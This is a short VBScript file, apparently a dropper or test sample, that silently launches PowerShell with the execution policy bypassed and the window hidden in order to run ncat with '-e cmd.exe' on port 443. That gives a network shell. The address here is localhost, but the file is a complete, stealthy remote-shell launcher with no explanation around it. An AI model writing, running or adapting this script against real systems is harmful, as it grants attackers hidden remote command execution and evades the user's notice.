Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""ncat 127.0.0.1 443 -e cmd.exe""", 0, False
